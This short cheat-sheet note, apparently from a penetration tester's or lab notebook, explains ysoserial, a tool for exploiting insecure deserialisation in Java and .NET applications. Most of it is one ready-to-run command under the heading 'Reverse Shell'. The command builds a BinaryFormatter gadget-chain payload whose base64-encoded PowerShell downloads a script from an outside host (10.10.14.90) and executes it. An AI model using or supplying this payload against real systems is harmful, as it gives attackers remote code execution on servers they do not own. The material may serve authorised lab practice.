Ysoserial is a tool used to generate **payloads for exploiting insecure deserialisation vulnerabilities** in Java or .NET applications. You are essentially looking for signs of **insecure deserialisation** — where an application is taking **user-controlled input** and **deserialising it without validation**.

Reverse Shell:

```bash
ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "cmd /c powershell -e KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AOQAwAC8AcgB1AG4ALgB0AHgAdAAnACkAIAB8ACAASQBFAFgA"
```

